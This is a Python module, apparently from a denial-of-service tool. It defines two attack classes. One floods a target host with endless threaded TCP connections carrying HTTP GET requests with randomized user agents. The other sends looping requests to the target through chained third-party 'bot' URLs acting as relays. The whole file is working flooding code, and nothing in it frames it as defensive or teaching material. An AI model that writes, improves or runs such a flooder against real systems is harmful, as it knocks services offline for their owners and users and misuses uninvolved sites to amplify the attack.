import os
import socket
import threading
import time
import random 
import urllib.request

from . import utils
from core.common import colors

global user_agents 
user_agents = utils.get_user_agents()

global headers_data 
headers_data = utils.get_headers_data()

global bots 
bots = utils.get_my_bots()


class ThreadAttack():

    def __init__(self, target, thr):
        self.target = target  

        for i in range(int(thr)):
            t = threading.Thread(target=self.attack)
            t.start()

    def attack(self):
        while True:
            self.shooting()

    def shooting(self):
        try:
            while True:
                packet = str("GET / HTTP/1.1\nHost: "+self.target.host+"\n\n User-Agent: "+random.choice(user_agents)+"\n"+headers_data).encode('utf-8')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target.host,int(self.target.port)))
                if s.sendto( packet, (self.target.host, int(self.target.port)) ):
                    s.shutdown(1)
                    print (colors.GREEN, time.ctime(time.time()), colors.ENDC, colors.BLUE, "<--packet sent! shooting--> ", colors.ENDC)
                else:
                    s.shutdown(1)
                    print(colors.RED, "shut<->down", colors.ENDC)
                time.sleep(.1)

        except socket.error as e:
            print(colors.RED, "no connection! server maybe down", colors.ENDC)
            # print("\033[91m",e,"\033[0m")
            time.sleep(.1)


class BotAttack():

    def __init__(self, target, thr):
        self.target = target  

        for i in range(int(thr)):
            t = threading.Thread(target=self.attack)
            t.start()
        
    def attack(self):
        bot = random.choice(bots)
        nesting_factor = random.randint(0, 3)
        for i in range(0, nesting_factor):
            another_bot = random.choice(bots)
            bot += another_bot

        print (colors.GREEN, "started attacking from ", bot, colors.ENDC)

        while True:
            self.shooting(bot)

    def shooting(self, bot):
        url =  bot + "https://" + self.target.host
        try:
            while True:
                urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(user_agents)}))
                print(colors.BLUE, "bot is shooting from", bot, colors.ENDC)
                time.sleep(.1)
        except Exception as e:
            time.sleep(.1)
